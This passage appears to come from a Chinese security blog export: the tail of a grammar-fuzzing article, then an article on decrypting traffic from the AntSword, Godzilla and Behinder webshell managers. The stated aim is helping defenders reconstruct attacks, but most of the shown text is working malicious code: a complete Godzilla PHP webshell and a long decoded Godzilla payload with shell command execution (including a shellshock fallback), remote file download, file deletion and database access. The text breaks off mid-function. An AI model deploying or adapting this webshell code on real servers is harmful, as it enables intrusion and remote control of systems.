\"&lt;float&gt;\": [(\"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;\", opts(pre=high_charge))], # high_charge是函数名称\n})\n\nCHARGE_GRAMMAR.update({\n    \"&lt;float&gt;\": [(\"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;\",\n                 opts(pre=lambda: random.randint(10000000, 90000000) / 100.0))] # 或者选择使用lambda表达式\n})\n\n另一种就是在Seeds的生成之后了：\nCHARGE_GRAMMAR.update({\n    \"&lt;credit-card-number&gt;\": [(\"&lt;digits&gt;\", opts(post=lambda digits: fix_credit_card(digits)))]\n})\n\n比如生成的digits不能满足Fuzz的需求，我们就可以通过这种方式来进行及时的修正，以提高Fuzz的效率。\nGreybox Fuzzing with Grammars​  除了Fuzzing性能类的问题之外的另一个问题就是变异的导向问题，在Grammars Fuzz生成Input的过程中对于Grammar的内部解析是随机的，但是对于Fuzz目标来说，大量的Input可能会触发相同的分支进而导致代码覆盖率难以达到理想的值。对于AFL类似的覆盖引导型Fuzz来说，因为白盒Fuzz的源代码插桩缘故可以统计代码覆盖率来进行不错的引导，但是还存在很多情况，比如黑盒，甚至是以一种WebServer为目标的Fuzz，统计代码覆盖率并不是一件简单的事情，这时候采取的措施应该是不断的增加Inputs生成的多样性，比如在上述的派生树的子节点的扩展过程进行统计，使其在生成Input语料的时候偏向于还没扩展过的节点。这时候就会面临新的问题，如何快速提升代码覆盖率？\n​  在进行Fuzz的时候，有时候一些输入的部分会被识别为关键字，比如C语言里面的int等，如果告诉Fuzz这些关键字就可以在短时间内极大的提升代码覆盖率，但是就长远来看整体的代码覆盖率还是要差于不使用关键字字典的情况。下面是使用关键字字典的变异Inputs生成器。\nclass DictMutator(Mutator):\n    \"\"\"Mutate strings using keywords from a dictionary\"\"\"\n\n    def __init__(self, dictionary: List[str]) -&gt; None:\n        \"\"\"Constructor. `dictionary` is the list of keywords to use.\"\"\"\n        super().__init__()\n        self.dictionary = dictionary\n        self.mutators.append(self.insert_from_dictionary)\n\n    def insert_from_dictionary(self, s: str) -&gt; str:\n        \"\"\"Returns s with a keyword from the dictionary inserted\"\"\"\n        pos = random.randint(0, len(s))\n        random_keyword = random.choice(self.dictionary)\n        return s[:pos] + random_keyword + s[pos:]\n\n但是问题在于关键字通过字典随机引入的方式很可能破坏了Input本来的正确输入结构进而引发不必要的损耗。解决的方法其实也很简单：Fuzzing with Input Fragments.\n\n对原有的Input进行Parse，形成派生树。\n对派生树进行节点互换或者节点替换等操作。\n对派生树进行还原，形成新的Input。\n\n以上的所有操作都在派生树上进行。为了更方便的进行编译操作，可以建立一个派生树的碎片池，每个碎片都由子树组成，子树包括符号和对应的Node节点和其子节点。不过对于派生树的parse其实是非常耗时的，因此可以设置一些时间限制来防止速度过低。不过以Fragments为基础的变异虽然可以很好的符合Inputs合法性的要求但是在代码覆盖率提升方面并不亮眼。而且以此为基础的LangFuzz其实在Inputs生成的速度上也远低于平常的结构化黑盒Fuzz。下面是两组对比数据：\nLangFuzz\nFrom the 300 generated inputs, 152 (50.67%) can be parsed.In total, 91 statements are covered.\n\nBlackFuzz\nFrom the 300 generated inputs, 36 (12.00%) can be parsed.In total, 161 statements are covered.\n\n可以看出以Fragments为基础的变异的优势在于它可以很好的生成符合结构化语法的变异。那么现在的疑问就是如何在保证输入语法正确性的前提下提升代码覆盖率？\n​  一种方法是利用类似AFL的覆盖引导方式，利用代码覆盖率不断作为变异的反馈，以此来不断的增添提高代码覆盖率的种子，同时提供structural mutations和32 byte-level mutations两种变异方式，如下：\nclass GreyboxGrammarFuzzer(GreyboxFuzzer):\n    \"\"\"Greybox fuzzer using grammars.\"\"\"\n\n    def __init__(self, seeds: List[str],\n                 byte_mutator: Mutator, tree_mutator: FragmentMutator,\n                 schedule: PowerSchedule) -&gt; None:\n        \"\"\"Constructor.\n        `seeds` - set of inputs to mutate.\n        `byte_mutator` - a byte-level mutator.\n        `tree_mutator` = a tree-level mutator.\n        `schedule` - a power schedule.\n        \"\"\"\n        super().__init__(seeds, byte_mutator, schedule)\n        self.tree_mutator = tree_mutator\n\n    def create_candidate(self) -&gt; str:\n        \"\"\"Returns an input generated by structural mutation \n           of a seed in the population\"\"\"\n        seed = cast(SeedWithStructure, self.schedule.choose(self.population))\n\n        # Structural mutation\n        trials = random.randint(0, 4)\n        for i in range(trials):\n            seed = self.tree_mutator.mutate(seed)\n\n        # Byte-level mutation\n        candidate = seed.data\n        if trials == 0 or not seed.has_structure or random.randint(0, 1) == 1:\n            dumb_trials = min(len(seed.data), 1 &lt;&lt; random.randint(1, 5))\n            for i in range(dumb_trials):\n                candidate = self.mutator.mutate(candidate)\n\n        return candidate\n\n想通的种子和变异次数的条件下，测试结果如下：\nFrom the 300 generated inputs, 1 (0.33%) can be parsed.\nIn total, 180 statements are covered.\n\n同时，在Inputs生成的速度方面极大提升，较高的代码覆盖率，但是在Inputs的合法性方面表现是最差的。那这个问题该如何解决呢？答案就是Fuzzing with Input Regions，这种Fuzz的变异方法不再使用派生树节点拆分重组等方式，而是通过将合法种子的不同区域直接进行拆分重组的方式，这里的区域指的是可以和派生树符号对应的连续的字节序列，这样的好处其实在于它操作的对象可能比Fragments更大或者更小，以此种方式进行变异在和上述变异条件相同的情况下测试结构如下：\nIt took the structural greybox fuzzer with region mutator\n        11.35 seconds to generate and execute 300 inputs.\n\nFrom the 300 generated inputs, 4 (1.33%) can be parsed.\nIn total, 168 statements are covered.\nOn average, 9.1% of a seed in the population can be successfully parsed.\n\n可以看到存在较高的代码覆盖率，在速度方面虽然优于Fragments Fuzz但是还是弱于普通的黑盒Fuzz，在代码覆盖率方面高于Fragments Fuzz并和GreyboxGrammarFuzzer维持在相差无几的水平。不过核心原因还是在于，通过的合法Inputs其实占比很低。那么如何解决这个问题？首先要让Fuzzer可以聚焦合法的Inputs。这一点其实前面已经讨论过了，只需要利用schedule给合法Inputs的相关结构赋予更多的权重。测试结果如下：\nIt took AFLSmart 20.75 seconds to generate and execute 300 inputs.\n\nFrom the 300 generated inputs, 46 (15.33%) can be parsed.\nIn total, 162 statements are covered.\nOn average, 23.7% of a seed in the population can be successfully parsed.\n\n可以看出在代码覆盖率保持较高水平的情况下，Inputs的合法性也得到了大幅度的提升，但是在Inputs的生成速度上来看，还是远弱于普通的GrammarFuzz。\n​  从上面可以看出，在选择Fuzz的时候本身就是一个取舍的问题，通过二次开发或者针对不同场景的选择才能更好的达到我们想要的结果。\nParser input​  假设你在做一个模糊测试，无论是Grammar Fuzz 或者其他的Fuzz也好，如果没有合适的种子那么通过不断变异形成合适的Inputs是非常困难的，当然AFL的作者展示了通过简单的输入不断向目标进化的可能性，但是这毕竟十分浪费时间和性能，效果在很多场景下估计也是不尽人意的。\n​  因此在进行模糊测试的时候如果可以获取一些poc，或者其它较好种子，比如在Fuzz js解释器的一个比较经常的做法就是将一些公开的poc，如下：\nvar haystack = \"foo\";\nvar re_text = \"^foo\";\nhaystack += \"x\";\nre_text += \"(x)\";\nvar re = new RegExp(re_text);\nre.test(haystack);\nRegExp.input = Number();\nprint(RegExp.$1);\n\n作为seeds进行变异，将生成的Inputs用来Fuzz解释器。表现出来不错的结果。\n\n\n\n\n\n\n\n\n\nTips:如何判断对面的代码覆盖率，一般黑盒情况下可以试时间，如果一个Input在对面耗费了更多的时间来运行，那么可以猜测其走过了更多的代码分支。\n总结​  在面对Fuzz的目标的时候最重要的是选择合适的变异方式以及较好的初始种子，根据目标和测试目的不断地进行取舍和针对性开发才能得到比较理想的结果。\n参考链接\n\n\n\n\n\n\n\n\nhttps://www.fuzzingbook.org\n文中数据测试来源大多为Fuzzingbook，因为根据电脑不同，其实具体数值结果会有一定偏差，但是结论都是一样的，因此就展示了书中的测试数据。\n","slug":"Fuzzing之Grammers","date":"2022-07-31T08:42:45.000Z","categories_index":"漏洞挖掘","tags_index":"Fuzz","author_index":"RainSec"},{"id":"06322427d537eca1634c7950b5477253","title":"Webshell工具加密流量解析","content":"前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。\n蚁剑蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：提取参数后的编码直接进行base64解码：\nQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb3BhcnI9cHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkb3BkaXIpOyRvY3dkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskdG1kaXI9Ii45ZjFlN2ZjODYiO0Bta2RpcigkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2ZvcigkaT0wOyRpPHNpemVvZigkb3BhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJG9jd2QuIi8iLiR0bWRpcik7fTtmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzU4ZGMiLiI1MjQyYiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiNzkiLiJlNTUiO31vYl9zdGFydCgpO3RyeXtwaHBpbmZvKCk7CmVjaG8gImtpZCIKCjt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7\n解密内容：\n@ini_set(\"display_errors\", \"0\");@set_time_limit(0);$opdir=@ini_get(\"open_basedir\");if($opdir) {$oparr=preg_split(\"/\\\\\\\\|\\//\",$opdir);$ocwd=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$tmdir=\".9f1e7fc86\";@mkdir($tmdir);@chdir($tmdir);@ini_set(\"open_basedir\",\"..\");for($i=0;$i&lt;sizeof($oparr);$i++){@chdir(\"..\");}@ini_set(\"open_basedir\",\"/\");@rmdir($ocwd.\"/\".$tmdir);};function asenc($out){return @base64_encode($out);};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \"358dc\".\"5242b\";echo @asenc($output);echo \"79\".\"e55\";}ob_start();try{phpinfo();\necho \"kid\"\n\n;}catch(Exception $e){echo \"ERROR://\".$e-&gt;getMessage();};asoutput();die();\n哥斯拉哥斯拉自带了几种加密方式，这里以php为例：分别为PHP_EVEAL_XOR_BASE64、PHP_XOR_BASE64、PHP_XOR_RAW为例。\nPHP_XOR_BASE64这个用哥斯拉生成的shell：\n&lt;?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i&lt;strlen($D);$i++) {\n        $c = $K[$i+1&amp;15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$pass='pass';\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\nif (isset($_POST[$pass])){\n    $data=encode(base64_decode($_POST[$pass]),$key);\n    if (isset($_SESSION[$payloadName])){\n\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,\"getBasicsInfo\")===false){\n            echo($payload);\n\n\n            $payload=encode($payload,$key);\n        }\n\t\teval($payload);\n\n        echo substr(md5($pass.$key),0,16);\n        echo base64_encode(encode(@run($data),$key));\n        echo substr(md5($pass.$key),16);\n    }else{\n        if (strpos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n根据shell文件可以看出加密过程，先将pass传递内容base64解码，然后将内容与key进行异或操做，注意这里的key实际上是生成shell的key的32位md5的前16位。那么我们根据这些即可写一个一次性的解码脚本，用第一次哥斯拉进行流量交互的payload为例（这里的key值为key）：将内容url解码后放入脚本中脚本如下：\n&lt;?php \n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i&lt;strlen($D);$i++) {\n        $c = $K[$i+1&amp;15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$pass='pass';\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n\n\n$post = \"\";\n#echo base64_decode($post);\necho \"&lt;br/&gt;\";\necho \"&lt;br/&gt;\";\n\n$data=encode(base64_decode($post),$key);\necho $data;\n\n\n解密结果如下：\n$parameters=array(); $_SES=array(); function run($pms){ global $ERRMSG; reDefSystemFunc(); $_SES=&amp;getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1&amp;&amp;@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if (isset($_SES[\"bypass_open_basedir\"])&amp;&amp;$_SES[\"bypass_open_basedir\"]==true){ @bypass_open_basedir(); } if (function_existsEx(\"set_error_handler\")){ @set_error_handler(\"payloadErrorHandler\"); } if (function_existsEx(\"set_exception_handler\")){ @set_exception_handler(\"payloadExceptionHandler\"); } $result=@evalFunc(); if ($result==null||$result===false){ $result=$ERRMSG; } if ($_SES!==null){ session_start(); $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId)); @session_write_close(); } if (canCallGzipEncode()){ $result=gzencode($result,6); } return $result; } function payloadExceptionHandler($exception){ global $ERRMSG; $ERRMSG.=\"ExceptionMsg:\".$exception-&gt;getMessage().\"\\r\\n\"; return true; } function payloadErrorHandler($errno, $errstr, $errfile=null, $errline=null,$errcontext=null){ global $ERRMSG; $ERRMSG.=\"ErrLine: {$errline} ErrorMsg:{$errstr}\\r\\n\"; return true; } function S1MiwYYr($D,$K){ for($i=0;$istrlen($pms)-1){ break; } } } function evalFunc(){ @session_write_close(); $className=get(\"codeName\"); $methodName=get(\"methodName\"); $_SES=&amp;getSession(); if ($methodName!=null){ if (strlen(trim($className))&gt;0){ if ($methodName==\"includeCode\"){ return includeCode(); }else{ if (isset($_SES[$className])){ return eval($_SES[$className]); }else{ return \"{$className} no load\"; } } }else{ if (function_exists($methodName)){ return $methodName(); }else{ return \"function {$methodName} not exist\"; } } }else{ return \"methodName Is Null\"; } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-&gt;read()){ $pf=$p.\"/\".$f; @chmod($pf,0777); if((is_dir($pf))&amp;&amp;($f!=\".\")&amp;&amp;($f!=\"..\")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)&amp;&amp;($f!=\".\")&amp;&amp;($f!=\"..\")){ @unlink($pf); } } $m-&gt;close(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get(\"fileName\"); if(is_dir($F)){ return deleteDir($F)?\"ok\":\"fail\"; }else{ return (file_exists($F)?@unlink($F)?\"ok\":\"fail\":\"fail\"); } } function setFileAttr(){ $type = get(\"type\"); $attr = get(\"attr\"); $fileName = get(\"fileName\"); $ret = \"Null\"; if ($type!=null&amp;&amp;$attr!=null&amp;&amp;$fileName!=null) { if ($type==\"fileBasicAttr\"){ if (@chmod($fileName,convertFilePermissions($attr))){ return \"ok\"; }else{ return \"fail\"; } }else if ($type==\"fileTimeAttr\"){ if (@touch($fileName,$attr)){ return \"ok\"; }else{ return \"fail\"; } }else{ return \"no ExcuteType\"; } }else{ $ret=\"type or attr or fileName is null\"; } return $ret; } function fileRemoteDown(){ $url=get(\"url\"); $saveFile=get(\"saveFile\"); if ($url!=null&amp;&amp;$saveFile!=null) { $data=@file_get_contents($url); if ($data!==false){ if (@file_put_contents($saveFile,$data)!==false){ @chmod($saveFile,0777); return \"ok\"; }else{ return \"write fail\"; } }else{ return \"read fail\"; } }else{ return \"url or saveFile is null\"; } } function copyFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (@is_file($srcFileName)){ if (copy($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } }else{ return \"The target does not exist or is not a file\"; } } function moveFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (rename($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } } function getBasicsInfo() { $data = array(); $data['OsInfo'] = @php_uname(); $data['CurrentUser'] = @get_current_user(); $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) &gt; 0 ? $data['CurrentUser'] : 'NULL'; $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR']; $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT']; $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR']; $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP']; $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR']; $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['disable_functions'] = @ini_get('disable_functions'); $data['disable_functions'] = strlen(trim($data['disable_functions'])) &gt; 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions'); $data['Open_basedir'] = @ini_get('open_basedir'); $data['timezone'] = @ini_get('date.timezone'); $data['encode'] = @ini_get('exif.encode_unicode'); $data['extension_dir'] = @ini_get('extension_dir'); $tmpDir=sys_get_temp_dir(); $separator=substr($tmpDir,strlen($tmpDir)-1,1); if ($separator!='\\\\'&amp;&amp;$separator!='/'){ $tmpDir=$tmpDir.'/'; } $data['systempdir'] = $tmpDir; $data['include_path'] = @ini_get('include_path'); $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT']; $data['PHP_SAPI'] = PHP_SAPI; $data['PHP_VERSION'] = PHP_VERSION; $data['PHP_INT_SIZE'] = PHP_INT_SIZE; $data['ProcessArch'] = PHP_INT_SIZE==8?\"x64\":\"x86\"; $data['PHP_OS'] = PHP_OS; $data['canCallGzipDecode'] = canCallGzipDecode(); $data['canCallGzipEncode'] = canCallGzipEncode(); $data['session_name'] = @ini_get(\"session.name\"); $data['session_save_path'] = @ini_get(\"session.save_path\"); $data['session_save_handler'] = @ini_get(\"session.save_handler\"); $data['session_serialize_handler'] = @ini_get(\"session.serialize_handler\"); $data['user_ini_filename'] = @ini_get(\"user_ini.filename\"); $data['memory_limit'] = @ini_get('memory_limit'); $data['upload_max_filesize'] = @ini_get('upload_max_filesize'); $data['post_max_size'] = @ini_get('post_max_size'); $data['max_execution_time'] = @ini_get('max_execution_time'); $data['max_input_time'] = @ini_get('max_input_time'); $data['default_socket_timeout'] = @ini_get('default_socket_timeout'); $data['mygid'] = @getmygid(); $data['mypid'] = @getmypid(); $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['loaded_extensions'] = @implode(',', @get_loaded_extensions()); $data['short_open_tag'] = @get_cfg_var('short_open_tag'); $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false'; $data['asp_tags'] = @get_cfg_var('asp_tags'); $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false'; $data['safe_mode'] = @get_cfg_var('safe_mode'); $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false'; $data['CurrentDir'] = str_replace('\\\\', '/', @dirname($_SERVER['SCRIPT_FILENAME'])); if (strlen(trim($data['CurrentDir']))==0){ $data['CurrentDir'] = str_replace('\\\\', '/', @dirname(__FILE__)); } $SCRIPT_FILENAME=@dirname(__FILE__); $data['FileRoot'] = ''; if (substr($SCRIPT_FILENAME, 0, 1) != '/') { $drivers=array('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'); foreach ($drivers as $L){ if (@is_dir(\"{$L}:/\")){ $data['FileRoot'] .= \"{$L}:/;\";} } if (empty($data['FileRoot'])){ $data['FileRoot']=substr($SCRIPT_FILENAME,0,3); } }else{ $data['FileRoot'] .= \"/\"; } $result=\"\"; foreach($data as $key=&gt;$value){ $result.=$key.\" : \".$value.\"\\n\"; } return $result; } function getFile(){ $dir=get('dirName'); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace('\\\\','/',dirname(__FILE__)); $dir.=\"/\"; $path=$dir; $allFiles = @scandir($path); $data=\"\"; if ($allFiles!=null){ $data.=\"ok\"; $data.=\"\\n\"; $data.=$path; $data.=\"\\n\"; foreach ($allFiles as $fileName) { if ($fileName!=\".\"&amp;&amp;$fileName!=\"..\"){ $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?\"1\":\"0\"); array_push($lineData,date(\"Y-m-d H:i:s\", @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?\"R\":\"\").(@is_writable($fullPath)?\"W\":\"\").(@is_executable($fullPath)?\"X\":\"\"); array_push($lineData,(strlen($fr)&gt;0?$fr:\"F\")); $data.=(implode(\"\\t\",$lineData).\"\\n\"); } } }else{ return \"Path Not Found Or No Permission!\"; } return $data; } function readFileContent(){ $fileName=get(\"fileName\"); if (@is_file($fileName)){ if (function_existsEx(\"is_readable\")){ return file_get_contents($fileName); }else{ return \"No Permission!\"; } }else{ return \"File Not Found\"; } } function uploadFile(){ $fileName=get(\"fileName\"); $fileValue=get(\"fileValue\"); if (@file_put_contents($fileName,$fileValue)!==false){ @chmod($fileName,0777); return \"ok\"; }else{ return \"fail\"; } } function newDir(){ $dir=get(\"dirName\"); if (@mkdir($dir,0777,true)!==false){ return \"ok\"; }else{ return \"fail\"; } } function newFile(){ $fileName=get(\"fileName\"); if (@file_put_contents($fileName,\"\")!==false){ return \"ok\"; }else{ return \"fail\"; } } function function_existsEx($functionName){ $d=explode(\",\",@ini_get(\"disable_functions\")); if(empty($d)){ $d=array(); }else{ $d=array_map('trim',array_map('strtolower',$d)); } return(function_exists($functionName)&amp;&amp;is_callable($functionName)&amp;&amp;!in_array($functionName,$d)); } function execCommand(){ @ob_start(); $cmdLine=get(\"cmdLine\"); if(substr(__FILE__,0,1)==\"/\"){ @putenv(\"PATH=\".getenv(\"PATH\").\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"); }else{ @putenv(\"PATH=\".getenv(\"PATH\").\";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\"); } $result=\"\"; if (!function_existsEx(\"runshellshock\")){ function runshellshock($d, $c) { if (substr($d, 0, 1) == \"/\" &amp;&amp; function_existsEx('putenv') &amp;&amp; (function_existsEx('error_log') || function_existsEx('mail'))) { if (strstr(readlink(\"/bin/sh\"), \"bash\") != FALSE) { $tmp = tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1\"); if (function_existsEx('error_log')) { error_log(\"a\", 1); } else { mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } } else { return False; } $output = @file_get_contents($tmp); @unlink($tmp); if ($output != \"\") { return $output; } } return False; }; } if(function_existsEx('system')){ @system($cmdLine,$ret); }elseif(function_existsEx('passthru')){ $result=@passthru($cmdLine,$ret); }elseif(function_existsEx('shell_exec')){ $result=@shell_exec($cmdLine); }elseif(function_existsEx('exec')){ @exec($cmdLine,$o,$ret); $result=join(\"\\n\",$o); }elseif(function_existsEx('popen')){ $fp=@popen($cmdLine,'r'); while(!@feof($fp)){ $result.=@fgets($fp,1024*1024); } @pclose($fp); }elseif(function_existsEx('proc_open')){ $p = @proc_open($cmdLine, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io); while(!@feof($io[1])){ $result.=@fgets($io[1],1024*1024); } while(!@feof($io[2])){ $result.=@fgets($io[2],1024*1024); } @fclose($io[1]); @fclose($io[2]); @proc_close($p); }elseif(substr(__FILE__,0,1)!=\"/\" &amp;&amp; @class_exists(\"COM\")){ $w=new COM('WScript.shell'); $e=$w-&gt;exec($cmdLine); $so=$e-&gt;StdOut(); $result.=$so-&gt;ReadAll(); $se=$e-&gt;StdErr(); $result.=$se-&gt;ReadAll(); }elseif (function_existsEx(\"pcntl_fork\")&amp;&amp;function_existsEx(\"pcntl_exec\")){ $cmd=\"/bin/bash\"; if (!file_exists($cmd)){ $cmd=\"/bin/sh\"; } $commandFile=sys_get_temp_dir().\"/\".time().\".log\"; $resultFile=sys_get_temp_dir().\"/\".(time()+1).\".log\"; @file_put_contents($commandFile,$cmdLine); switch (pcntl_fork()) { case 0: $args = array(\"-c\", \"$cmdLine &gt; $resultFile\"); pcntl_exec($cmd, $args); // the child will only reach this point on exec failure, // because execution shifts to the pcntl_exec()ed command exit(0); default: break; } if (!file_exists($resultFile)){ sleep(2); } $result=file_get_contents($resultFile); @unlink($commandFile); @unlink($resultFile); }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) { }else{ return \"none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available\"; } $result .= @ob_get_contents(); @ob_end_clean(); return $result; } function execSql(){ $dbType=get(\"dbType\"); $dbHost=get(\"dbHost\"); $dbPort=get(\"dbPort\"); $username=get(\"dbUsername\"); $password=get(\"dbPassword\"); $execType=get(\"execType\"); $execSql=get(\"execSql\"); $charset=get(\"dbCharset\"); $currentDb=get(\"currentDb\"); function mysqli_exec($host,$port,$username,$password,$execType,$currentDb,$sql,$charset){ // 创建连接 $conn = new mysqli($host,$username,$password,\"\",$port); // Check connection if ($conn-&gt;connect_error) { return $conn-&gt;connect_error; } if (!empty($charset)){ $conn-&gt;set_charset($charset); } if (!empty($currentDb)){ $conn-&gt;select_db($currentDb); } $result = $conn-&gt;query($sql); if ($conn-&gt;error){ return $conn-&gt;error; } if ($execType==\"update\"){ return \"Query OK, \".$conn-&gt;affected_rows.\" rows affected\"; }else{ $data=\"ok\\n\"; while ($column = $result-&gt;fetch_field()){ $data.=base64_encode($column-&gt;name).\"\\t\"; } $data.=\"\\n\"; if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { foreach ($row as $value){ $data.=base64_encode($value).\"\\t\"; } $data.=\"\\n\"; } } return $data; } } function mysql_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset) { $con = @mysql_connect($host.\":\".$port, $username, $password); if (!$con) { return mysql_error(); } else { if (!empty($charset)){ mysql_set_charset($charset,$con); } if (!empty($currentDb)){ if (function_existsEx(\"mysql_selectdb\")){ mysql_selectdb($currentDb,$con); }elseif (function_existsEx(\"mysql_select_db\")){ mysql_select_db($currentDb,$con); } } $result = @mysql_query($sql); if (!$result) { return mysql_error(); } if ($execType == \"update\") { return \"Query OK, \".mysql_affected_rows($con).\" rows affected\"; } else { $data = \"ok\\n\"; for ($i = 0; $i &lt; mysql_num_fields($result); $i++) { $data.= base64_encode(mysql_field_name($result, $i)).\"\\t\"; } $data.= \"\\n\"; $rowNum = mysql_num_rows($result); if ($rowNum &gt; 0) { while ($row = mysql_fetch_row($result)) { foreach($row as $value) { $data.= base64_encode($value).\"\\t\"; } $data.= \"\\n\"; } } } @mysql_close($con); return $data; } } function mysqliEx_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset){ $port == \"\" ? $port = \"3306\" : $port; $T=@mysqli_connect($host,$username,$password,\"\",$port); if (!empty($charset)){ @mysqli_set_charset($charset); } if (!empty($currentDb)){ @mysqli_select_db($T,$currentDb); } $q=@mysqli_query($T,$sql); if(is_bool($q)){ return mysqli_error($T); }else{ if (mysqli_num_fields($q)&gt;0){ $i=0; $data = \"ok\\n\"; while($col=@mysqli_fetch_field($q)){ $data.=base64_encode($col-&gt;name).\"\\t\"; $i++; } $data.=\"\\n\"; while($rs=@mysqli_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.=\"\\n\"; } return $data; }else{ return \"Query OK, \".@mysqli_affected_rows($T).\" rows affected\"; } } } function pg_execEx($host, $port, $username, $password, $execType,$currentDb, $sql,$charset){ $port == \"\" ? $port = \"5432\" : $port; $arr=array( 'host'=&gt;$host, 'port'=&gt;$port, 'user'=&gt;$username, 'password'=&gt;$password ); if (!empty($currentDb)){ $arr[\"dbname\"]=$currentDb; } $cs=''; foreach($arr as $k=&gt;$v) { if(empty($v)){ continue; } $cs .= \"$k=$v \"; } $T=@pg_connect($cs); if(!$T){ return @pg_last_error(); }else{ if (!empty($charset)){ @pg_set_client_encoding($T,$charset); } $q=@pg_query($T, $sql); if(!$q){ return @pg_last_error(); }else{ $n=@pg_num_fields($q); if($n===NULL){ return @pg_last_error(); }elseif($n===0){ return \"Query OK, \".@pg_affected_rows($q).\" rows affected\"; }else{ $data = \"ok\\n\"; for($i=0;$i&lt;$n;$i++){ $data.=base64_encode(@pg_field_name($q,$i)).\"\\t\"; } $data.= \"\\n\"; while($row=@pg_fetch_row($q)){ for($i=0;$i&lt;$n;$i++){ $data.=base64_encode($row[$i]!==NULL?$row[$i]:\"NULL\").\"\\t\"; } $data.= \"\\n\"; } return $data; } } } } function sqlsrv_exec($host, $port, $username, $password, $execType, $currentDb,$sql){ 